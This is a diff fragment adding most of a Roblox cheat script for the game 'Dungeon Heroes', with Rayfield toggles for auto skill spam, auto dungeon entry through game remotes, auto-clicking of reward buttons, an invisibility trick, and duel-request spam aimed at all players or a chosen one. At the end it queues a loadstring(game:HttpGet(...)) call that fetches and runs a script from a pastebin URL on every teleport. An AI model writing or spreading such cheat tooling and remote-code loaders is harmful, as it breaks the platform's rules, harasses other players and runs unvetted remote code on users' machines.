+            or SkillRunId ~= CurrentRun then  
+                break  
+            end  
+
+            -- Key Press  
+            pcall(function()  
+                VirtualInputManager:SendKeyEvent(  
+                    true,  
+                    Key,  
+                    false,  
+                    game  
+                )  
+            end)  
+
+            task.wait(HoldTime)  
+
+            -- Key Release  
+            pcall(function()  
+                VirtualInputManager:SendKeyEvent(  
+                    false,  
+                    Key,  
+                    false,  
+                    game  
+                )  
+            end)  
+
+            task.wait(Delay)  
+        end  
+    end  
+end)
+
+end
+
+-- Toggle
+UtilityTab:CreateToggle({
+Name = "Auto Skill Spam",
+CurrentValue = false,
+Flag = "AutoSkillSpam",
+
+Callback = function(Value)  
+
+    if Value then  
+        StartSkillSpam()  
+        print("Auto Skills: ON")  
+    else  
+        AutoSkillEnabled = false  
+        SkillRunId += 1  
+
+        -- Release all keys when disabled  
+        for _, Key in ipairs(KEYS) do  
+            pcall(function()  
+                VirtualInputManager:SendKeyEvent(  
+                    false,  
+                    Key,  
+                    false,  
+                    game  
+                )  
+            end)  
+        end  
+
+        print("Auto Skills: OFF")  
+    end  
+end
+
+})
+
+do
+-- Dungeon Heroes | Auto Entry V6
+-- Solo Queue + Auto Start Dungeon
+
+local RS = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+
+local Player = Players.LocalPlayer
+local Remotes = RS:WaitForChild("Remotes")
+
+local SetSettings = Remotes:WaitForChild("Parties/SetSettings")
+local SaveModifiers = Remotes:WaitForChild("SaveDungeonModifierConfig")
+local TriggerStartDungeon = Remotes:WaitForChild("TriggerStartDungeon")
+
+local Dungeons = require(RS.Systems.Dungeons)
+local Locations = require(RS.Systems.Locations)
+
+local Floors = Locations:GetFloorData()
+local Difficulties = Dungeons:GetAllDifficulties()
+
+local Category = "All"
+local SelectedDungeon
+local SelectedDifficulty
+
+local DungeonOptions = {}
+local DifficultyOptions = {}
+local DungeonNameToKey = {}
+
+local AutoStartDungeon = true
+local StartFired = false
+local Entering = false
+
+local function GetValue(value)
+return type(value) == "table" and value[1] or value
+end
+
+local function Matches(data)
+if Category == "All" then return true end
+
+if Category == "Raids" then  
+    return data.IsRaid == true  
+elseif Category == "Events" then  
+    return data.IsEventDungeon == true  
+elseif Category == "Special" then  
+    return data.SpecialDungeon == true  
+        or data.IsGauntlet == true  
+elseif Category == "Normal" then  
+    return data.IsDungeon == true  
+        and data.IsRaid ~= true  
+        and data.IsEventDungeon ~= true  
+        and data.SpecialDungeon ~= true  
+        and data.IsGauntlet ~= true  
+end  
+
+return false
+
+end
+
+local DungeonDropdown
+local DifficultyDropdown
+
+local function RefreshDungeons()
+table.clear(DungeonOptions)
+table.clear(DungeonNameToKey)
+
+local entries = {}  
+local titleCounts = {}  
+
+for name, data in pairs(Floors) do  
+    if type(data) == "table"  
+        and (data.IsDungeon or data.IsRaid  
+        or data.IsEventDungeon or data.SpecialDungeon  
+        or data.IsGauntlet)  
+        and Matches(data) then  
+
+        local displayName = data.Title or name  
+
+        titleCounts[displayName] =  
+            (titleCounts[displayName] or 0) + 1  
+
+        table.insert(entries, {  
+            Name = name,  
+            Title = displayName,  
+            Data = data  
+        })  
+    end  
+end  
+
+table.sort(entries, function(a, b)  
+    local da = a.Data  
+    local db = b.Data  
+
+    if da.IsRaid and db.IsRaid then  
+        local orderA = da.DungeonSelectZIndex  
+            or da.LayoutOrder or da.RequiredLevel or 999999  
+
+        local orderB = db.DungeonSelectZIndex  
+            or db.LayoutOrder or db.RequiredLevel or 999999  
+
+        if orderA ~= orderB then  
+            return orderA < orderB  
+        end  
+    else  
+        local levelA = da.RequiredLevel or 999999  
+        local levelB = db.RequiredLevel or 999999  
+
+        if levelA ~= levelB then  
+            return levelA < levelB  
+        end  
+    end  
+
+    return a.Title < b.Title  
+end)  
+
+for _, entry in ipairs(entries) do  
+    local displayName = entry.Title  
+
+    -- Duplicate titles ko distinguish karna  
+    if titleCounts[displayName] > 1 then  
+        displayName = displayName .. " (" .. entry.Name .. ")"  
+    end  
+
+    table.insert(DungeonOptions, displayName)  
+    DungeonNameToKey[displayName] = entry.Name  
+end  
+
+SelectedDungeon = nil  
+SelectedDifficulty = nil  
+
+DungeonDropdown:Refresh(DungeonOptions)  
+DifficultyDropdown:Refresh({})
+
+end
+
+local function RefreshDifficulties()
+table.clear(DifficultyOptions)
+SelectedDifficulty = nil
+
+local data = Floors[SelectedDungeon]  
+local levels = data and data.DifficultyLevels  
+
+if type(levels) == "table" then  
+    local indexes = {}  
+
+    for index in pairs(levels) do  
+        if type(index) == "number" then  
+            table.insert(indexes, index)  
+        end  
+    end  
+
+    table.sort(indexes)  
+
+    for _, index in ipairs(indexes) do  
+        local name = Difficulties[index]  
+
+
+        local ok, available = pcall(function()  
+            return Dungeons:IsDungeonDifficultyAvailable(  
+                SelectedDungeon, index  
+            )  
+        end)  
+
+        if name and ok and available then  
+            table.insert(DifficultyOptions, name)  
+        end  
+    end  
+end  
+
+DifficultyDropdown:Refresh(DifficultyOptions)
+
+end
+
+-- Category
+AutoGrindTab:CreateDropdown({
+Name = "Category",
+Options = {"All", "Normal", "Raids", "Events", "Special"},
+CurrentOption = {"All"},
+Callback = function(value)
+Category = GetValue(value)
+RefreshDungeons()
+end
+})
+
+-- Dungeon
+DungeonDropdown = AutoGrindTab:CreateDropdown({
+Name = "Select Dungeon / Raid",
+Options = {},
+CurrentOption = {},
+Callback = function(value)
+local selected = GetValue(value)
+
+if type(selected) ~= "string" then  
+    return  
+end  
+
+SelectedDungeon = DungeonNameToKey[selected]  
+
+if not SelectedDungeon then  
+    warn("Dungeon key not found:", selected)  
+    return  
+end  
+
+task.defer(function()  
+    RefreshDifficulties()  
+end)
+
+end
+})
+
+-- Difficulty
+DifficultyDropdown = AutoGrindTab:CreateDropdown({
+Name = "Select Difficulty",
+Options = {},
+CurrentOption = {},
+Callback = function(value)
+SelectedDifficulty = GetValue(value)
+end
+})
+
+-- Original captured modifiers preserved
+local Modifiers = {
+enabled = true,
+enabledModifiers = {
+["titans-rage__5"] = true,
+["colossus__5"] = true,
+["titans-rage__1"] = true,
+["quake-step__1"] = true,
+["fault-line__4"] = true,
+["raid-champions__1"] = true,
+["shared-aegis__5"] = true,
+["quake-step__2"] = true,
+["tremor__3"] = true,
+["barren__1"] = true,
+["titans-rage__6"] = true,
+["quake-step__3"] = true,
+["titan-burden__5"] = true,
+["aftershock-armor__3"] = true,
+["permadeath-pact__6"] = true,
+["titans-rage__3"] = true,
+["raid-champions__3"] = true,
+["raid-champions__4"] = true,
+["raid-champions__5"] = true,
+["unbreakable-core__5"] = true,
+["fault-line__3"] = true,
+["borrowed-time__6"] = true,
+["runic-disenchant__1"] = true,
+["aftershock-armor__2"] = true,
+["stonebound__4"] = true,
+["glass-soul__6"] = true,
+["titans-rage__4"] = true,
+["raid-champions__2"] = true,
+["aftershock-armor__4"] = true,
+["runic-disenchant__4"] = true,
+["raid-champions__6"] = true,
+["titans-rage__2"] = true,
+["runic-disenchant__2"] = true
+},
+roulette = false
+}
+
+-- Enter Dungeon
+AutoGrindTab:CreateButton({
+Name = "ENTER SELECTED DUNGEON",
+
+Callback = function()  
+    if Entering then return end  
+
+    if not SelectedDungeon or not SelectedDifficulty then  
+        Rayfield:Notify({  
+            Title = "Selection Missing",  
+            Content = "Select dungeon and difficulty",  
+            Duration = 3  
+        })  
+        return  
+    end  
+
+    local difficultyIndex = table.find(  
+        Difficulties, SelectedDifficulty  
+    )  
+
+    if not difficultyIndex then return end  
+
+    Entering = true  
+    StartFired = false  
+
+    local success, err = pcall(function()  
+        SetSettings:FireServer(  
+            SelectedDungeon,  
+            difficultyIndex,  
+            1,  
+            true,  
+            false,  
+            {}  
+        )  
+
+        SaveModifiers:FireServer(  
+            SelectedDungeon,  
+            Modifiers  
+        )  
+    end)  
+
+    if not success then  
+        Entering = false  
+        warn("Entry Error:", err)  
+        return  
+    end  
+
+    Rayfield:Notify({  
+        Title = "Solo Queue",  
+        Content = "Settings submitted. Waiting for entry...",  
+        Duration = 4  
+    })  
+
+    task.delay(15, function()  
+        Entering = false  
+    end)  
+end
+
+})
+
+-- Auto Start Toggle
+AutoGrindTab:CreateToggle({
+Name = "Auto Start Dungeon",
+CurrentValue = true,
+Flag = "AutoStartDungeonToggle",
+
+Callback = function(value)  
+    AutoStartDungeon = value  
+
+    if not value then  
+        StartFired = false  
+    end  
+end
+
+})
+
+-- Auto Start Detection (Fixed)
+task.spawn(function()
+while task.wait(0.1) do
+if not AutoStartDungeon then
+continue
+end
+
+if StartFired then  
+        continue  
+    end  
+
+    local ok, locationName, locationData = pcall(function()  
+        return Locations:GetCurrentLocation()  
+    end)  
+
+    if not AutoStartDungeon then  
+        continue  
+    end  
+
+    local inDungeon = ok and locationData and (  
+        locationData.IsDungeon  
+        or locationData.IsRaid  
+        or locationData.IsEventDungeon  
+        or locationData.IsGauntlet  
+    )  
+
+    if inDungeon and AutoStartDungeon and not StartFired then  
+
+        -- Final toggle check  
+        if not AutoStartDungeon then  
+            continue  
+        end  
+
+        StartFired = true  
+
+        if not AutoStartDungeon then  
+            StartFired = false  
+            continue  
+        end  
+
+        local fired, err = pcall(function()  
+            TriggerStartDungeon:FireServer()  
+        end)  
+
+        if fired then  
+            print("Auto Start Dungeon: Fired")  
+        else  
+            warn("Auto Start Error:", err)  
+            StartFired = false  
+        end  
+    end  
+end
+
+end)
+
+RefreshDungeons()
+end
+
+local Players = game:GetService("Players")
+local GuiService = game:GetService("GuiService")
+local VirtualInputManager = game:GetService("VirtualInputManager")
+local LocalPlayer = Players.LocalPlayer
+
+getgenv().AutoTapChestUI = false
+
+-- Button ko instant trigger karne ka function
+local function instantTapButton(btn)
+if not btn or not btn.Visible then return end
+
+-- 1. SelectedObject + Return Key (Instant Engine Click)  
+pcall(function()  
+    btn.Selectable = true  
+    GuiService.SelectedObject = btn  
+    VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Return, false, game)  
+    VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Return, false, game)  
+    GuiService.SelectedObject = nil  
+end)  
+
+-- 2. Signal Connections Fire  
+if getconnections then  
+    local fakeTouchBegin = {UserInputType = Enum.UserInputType.Touch, UserInputState = Enum.UserInputState.Begin}  
+    local fakeTouchEnd = {UserInputType = Enum.UserInputType.Touch, UserInputState = Enum.UserInputState.End}  
+
+    local function fireSig(sig, a, b)  
+        for _, conn in pairs(getconnections(sig)) do  
+            pcall(function() if conn.Fire then conn:Fire(a, b) end end)  
+            pcall(function() if conn.Function then task.spawn(conn.Function, a, b) end end)  
+        end  
+    end  
+
+    fireSig(btn.Activated, fakeTouchBegin, 1)  
+    fireSig(btn.MouseButton1Click)  
+    fireSig(btn.MouseButton1Down, 0, 0)  
+    fireSig(btn.MouseButton1Up, 0, 0)  
+    if btn.TouchTap then fireSig(btn.TouchTap, {Vector2.zero}) end  
+    fireSig(btn.InputBegan, fakeTouchBegin, false)  
+    fireSig(btn.InputEnded, fakeTouchEnd, false)  
+end  
+
+-- 3. Screen Coordinates Tap Fallback  
+pcall(function()  
+    local inset = GuiService:GetGuiInset()  
+    local pos = btn.AbsolutePosition  
+    local size = btn.AbsoluteSize  
+    local x = pos.X + (size.X / 2)  
+    local y = pos.Y + (size.Y / 2) + inset.Y  
+
+    VirtualInputManager:SendMouseButtonEvent(x, y, 0, true, game, 1)  
+    VirtualInputManager:SendMouseButtonEvent(x, y, 0, false, game, 1)  
+end)
+
+end
+
+-- Rayfield Toggle
+AutoGrindTab:CreateToggle({
+Name = "Auto Next & Claim All",
+CurrentValue = false,
+Flag = "AutoTapChestUI",
+Callback = function(Value)
+getgenv().AutoTapChestUI = Value
+
+if Value then  
+        task.spawn(function()  
+            while getgenv().AutoTapChestUI do  
+                pcall(function()  
+                    local playerGui = LocalPlayer:FindFirstChild("PlayerGui")  
+                    local chestOpen = playerGui and playerGui:FindFirstChild("ChestOpen")  
+                      
+                    if chestOpen and chestOpen.Enabled then  
+                        local overlay = chestOpen:FindFirstChild("Overlay")  
+                        local actionButtons = overlay and overlay:FindFirstChild("ActionButtons")  
+                          
+                        if actionButtons and overlay.Visible then  
+                            for _, child in ipairs(actionButtons:GetChildren()) do  
+                                if child.Name == "Button" and child:IsA("GuiObject") and child.Visible then  
+                                    for _, desc in ipairs(child:GetDescendants()) do  
+                                        if desc:IsA("TextLabel") or desc:IsA("TextButton") then  
+                                            local txt = desc.Text  
+                                            if txt == "Next" or txt == "Claim All" then  
+                                                instantTapButton(child)  
+                                                break  
+                                            end  
+                                        end  
+                                    end  
+                                end  
+                            end  
+                        end  
+                    end  
+                end)  
+                task.wait(0.05)  
+            end  
+        end)  
+    end  
+end,
+
+})
+
+-- ==========================================
+-- DUNGEON HEROES | AUTO PLAY AGAIN
+-- ==========================================
+
+local Players = game:GetService("Players")
+local RS = game:GetService("ReplicatedStorage")
+local TeleportService = game:GetService("TeleportService")
+local GuiService = game:GetService("GuiService")
+
+local Player = Players.LocalPlayer
+local Remote = RS.Remotes.SetExitChoice
+
+local Enabled = false
+local Busy = false
+
+local function IsDungeonCleared()
+local gui = Player.PlayerGui:FindFirstChild("DungeonCleared")
+if not gui or not gui.Enabled then
+return false
+end
+
+local frame = gui:FindFirstChild("Frame")  
+local cleared = frame and frame:FindFirstChild("Cleared")  
+
+return frame and frame.Visible  
+    and cleared and cleared.Visible
+
+end
+
+-- Agar phir bhi kabhi HTTP 404 ya TP Fail aaye, toh bina GUI check kiye direct retry karega
+TeleportService.TeleportInitFailed:Connect(function(player, teleportResult, errorMessage)
+if player == Player and Enabled then
+warn("Teleport Failed (" .. tostring(teleportResult) .. "): " .. tostring(errorMessage) .. " - Retrying GoAgain...")
+
+pcall(function()  
+        GuiService:ClearError() -- 404 Error popup ko screen se hatayega  
+    end)  
+      
+    task.wait(4) -- Server cooldown hatne ka wait  
+    pcall(function()  
+        Remote:FireServer("GoAgain")  
+    end)  
+      
+    Busy = false  
+end
+
+end)
+
+AutoGrindTab:CreateToggle({
+Name = "Auto Play Again",
+CurrentValue = false,
+Flag = "AutoPlayAgainToggle",
+
+Callback = function(value)  
+    Enabled = value  
+
+    if value then  
+        task.spawn(function()  
+            while Enabled do  
+                if not Busy and IsDungeonCleared() then  
+                    Busy = true  
+
+                    -- Agar pehle se koi error popup hai toh clear karo  
+                    pcall(function()  
+                        GuiService:ClearError()  
+                    end)  
+
+                    local success, err = pcall(function()  
+                        Remote:FireServer("GoAgain")  
+                    end)  
+
+                    if not success then  
+                        warn("Play Again Error:", err)  
+                    end  
+
+                    -- 0.5s ki jagah 6s wait rakho taaki ek hi baar remote fire ho aur 404 error na aaye  
+                    task.wait(6)  
+                    Busy = false  
+                end  
+
+                task.wait(0.2)  
+            end  
+        end)  
+    end  
+end
+
+})
+
+do -- << 'do' BLOCK (Safety Wrapper) >>
+
+local Players = game:GetService("Players")  
+local LocalPlayer = Players.LocalPlayer  
+local Debris = game:GetService("Debris")  
+
+-- ===== CONFIGURATION =====  
+local INVIS_POS = Vector3.new(-25.95, 84, 3537.55)   
+local SOUND_ID = "rbxassetid://942127495"  
+
+-- ===== STATE =====  
+local invisEnabled = false  -- 🔥 invis state remember karega  
+
+-- ===== HELPER FUNCTIONS =====  
+
+-- 1. Sound Function  
+local function PlayToggleSound()  
+    local sound = Instance.new("Sound")  
+    sound.Name = "InvisSound"  
+    sound.SoundId = SOUND_ID  
+    sound.Volume = 1  
+    sound.Parent = game:GetService("SoundService")  
+    sound:Play()  
+    Debris:AddItem(sound, 2)  
+end  
+
+-- 2. Transparency Handler  
+local function SetVisualTransparency(val)  
+    if LocalPlayer.Character then  
+        for _, part in pairs(LocalPlayer.Character:GetDescendants()) do  
+            if part:IsA("BasePart") or part:IsA("Decal") then  
+                if part.Name ~= "HumanoidRootPart" then  
+                    part.Transparency = val  
+                end  
+            end  
+        end  
+    end  
+end  
+
+-- ===== MAIN LOGIC =====  
+
+local function ApplyInvisToCharacter(char)  
+    if not char or not char:FindFirstChild("HumanoidRootPart") then return end  
+
+    local hrp = char.HumanoidRootPart  
+    local savedPos = hrp.CFrame  
+
+    hrp.CFrame = CFrame.new(INVIS_POS)  
+    task.wait(0.15)  
+
+    local seat = Instance.new("Seat")  
+    seat.Name = "InvisSeat"  
+    seat.Anchored = false  
+    seat.CanCollide = false  
+    seat.Transparency = 1  
+    seat.Position = INVIS_POS  
+    seat.Parent = workspace  
+
+    local weld = Instance.new("Weld")  
+    weld.Part0 = seat  
+    weld.Part1 = char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso")  
+    weld.Parent = seat  
+
+    task.wait(0.1)  
+    seat.CFrame = savedPos  
+
+    SetVisualTransparency(0.5)  
+end  
+
+local function RemoveInvis()  
+    local seat = workspace:FindFirstChild("InvisSeat")  
+    if seat then seat:Destroy() end  
+    SetVisualTransparency(0)  
+end  
+
+local function ToggleInvisibility(State)  
+    invisEnabled = State  
+
+    local char = LocalPlayer.Character  
+    if not char or not char:FindFirstChild("HumanoidRootPart") then return end  
+
+    PlayToggleSound()  
+
+    if State then  
+        ApplyInvisToCharacter(char)  
+    else  
+        RemoveInvis()  
+    end  
+end  
+
+-- ===== UI =====  
+
+MiscellaneousTab:CreateToggle({  
+    Name = "👻 Invisible Mode",  
+    CurrentValue = false,  
+    Callback = function(Value)  
+        ToggleInvisibility(Value)  
+    end,  
+})  
+
+-- ===== AUTO RE-APPLY ON RESPAWN / LOBBY TP =====  
+
+LocalPlayer.CharacterAdded:Connect(function(char)  
+    task.wait(0.5) -- thoda wait taaki HRP load ho jaaye  
+    if invisEnabled then  
+        ApplyInvisToCharacter(char) -- 🔥 new round pe auto invis  
+    else  
+        RemoveInvis()  
+    end  
+end)  
+
+Players.PlayerRemoving:Connect(function(plr)  
+    if plr == LocalPlayer then  
+        RemoveInvis()  
+    end  
+end)
+
+end -- << END OF BLOCK >>
+
+-- Dungeon Heroes | Disable VFX
+-- Rayfield UI + Loader
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local SetSetting = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("SetSetting")
+
+MiscellaneousTab:CreateToggle({
+Name = "Disable VFX",
+CurrentValue = true,
+Flag = "DisableVFX",
+
+Callback = function(Value)  
+    SetSetting:FireServer("DisableVFX", true)  
+end
+
+})
+
+-- Automatically enforce TRUE
+SetSetting:FireServer("DisableVFX", true)
+
+-- Auto Duel | Fast Individual Requests
+
+local Players = game:GetService("Players")
+local RS = game:GetService("ReplicatedStorage")
+
+local LocalPlayer = Players.LocalPlayer
+
+local DuelRemote = RS:WaitForChild("Remotes")
+:WaitForChild("Duels/RequestDuel")
+
+local AutoDuel = false
+local Delay = 0.1
+
+MiscellaneousTab:CreateToggle({
+Name = "Auto Duel All Players",
+CurrentValue = false,
+Callback = function(Value)
+AutoDuel = Value
+
+if Value then  
+        task.spawn(function()  
+            while AutoDuel do  
+                for _, player in ipairs(Players:GetPlayers()) do  
+                    if not AutoDuel then  
+                        break  
+                    end  
+
+                    if player ~= LocalPlayer then  
+                        pcall(function()  
+                            DuelRemote:FireServer(player.UserId)  
+                        end)  
+
+                        task.wait(Delay)  
+                    end  
+                end  
+
+                task.wait(Delay)  
+            end  
+        end)  
+    end  
+end
+
+})
+
+-- Selected Player Auto Duel | Rayfield
+
+local Players = game:GetService("Players")
+local RS = game:GetService("ReplicatedStorage")
+
+local LocalPlayer = Players.LocalPlayer
+
+local DuelRemote = RS:WaitForChild("Remotes")
+:WaitForChild("Duels/RequestDuel")
+
+local SearchText = ""
+local SelectedDuel = false
+local Delay = 0.1
+
+-- Find matching player
+local function FindPlayer(query)
+query = string.lower(query)
+
+if #query < 2 then  
+    return nil  
+end  
+
+local matches = {}  
+
+for _, player in ipairs(Players:GetPlayers()) do  
+    if player ~= LocalPlayer then  
+
+        local username = string.lower(player.Name)  
+        local display = string.lower(player.DisplayName)  
+
+        if string.find(username, query, 1, true)  
+        or string.find(display, query, 1, true) then  
+            table.insert(matches, player)  
+        end  
+    end  
+end  
+
+-- Avoid accidentally selecting the wrong player  
+if #matches == 1 then  
+    return matches[1]  
+end  
+
+return nil
+
+end
+
+-- Search box
+MiscellaneousTab:CreateInput({
+Name = "Player Username / DisplayName",
+PlaceholderText = "Enter 2-3 letters...",
+RemoveTextAfterFocusLost = false,
+Callback = function(Value)
+SearchText = Value
+
+local target = FindPlayer(SearchText)  
+
+    if target then  
+        Rayfield:Notify({  
+            Title = "Player Found",  
+            Content = target.DisplayName ..  
+                " (@" .. target.Name .. ")",  
+            Duration = 3  
+        })  
+    end  
+end
+
+})
+
+-- Selected Duel Toggle
+MiscellaneousTab:CreateToggle({
+Name = "Selected Player Duel",
+CurrentValue = false,
+Callback = function(Value)
+SelectedDuel = Value
+
+if Value then  
+        task.spawn(function()  
+            while SelectedDuel do  
+
+                local target = FindPlayer(SearchText)  
+
+                if target and target.Parent == Players then  
+                    pcall(function()  
+                        DuelRemote:FireServer(target.UserId)  
+                    end)  
+                end  
+
+                task.wait(Delay)  
+            end  
+        end)  
+    end  
+end
+
+})
+
+-- ==========================================
+-- AUTO EXECUTE ON TELEPORT & CONFIG LOADER
+-- ==========================================
+MiscellaneousTab:CreateSection("Auto Execute Settings")
+
+local AutoExecEnabled = true
+local TeleportQueued = false
+
+-- Yahan apni is પૂरी script ka Raw Link (Pastefy/GitHub) dalein:
+local SCRIPT_URL = "https://pastebin.com/raw/1VAwzbWy"
+
+local queueTeleport = queue_on_teleport or (syn and syn.queue_on_teleport) or (fluxus and fluxus.queue_on_teleport)
+
+local function SetupTeleportQueue()
+if queueTeleport and AutoExecEnabled and not TeleportQueued then
+TeleportQueued = true
+pcall(function()
+queueTeleport('loadstring(game:HttpGet("' .. SCRIPT_URL .. '"))()')
+end)
+end
+end
+
+-- Toggle in Miscellaneous Tab (Default: ON)
+MiscellaneousTab:CreateToggle({
+Name = "Auto Execute (Same Game TP)",
+CurrentValue = true,
+Flag = "AutoExecToggle",
+Callback = function(Value)
+AutoExecEnabled = Value
+end,
+})
+
+-- Jab player ek hi experience mein teleport hoga (Lobby -> Dungeon -> Lobby)
+player.OnTeleport:Connect(function(State)
+if AutoExecEnabled then
+SetupTeleportQueue()
+end
+end)
+
+-- Sabse last mein pichli saved settings (Speed, Toggles, Sliders) wapas load karega
+Rayfield:LoadConfiguration()
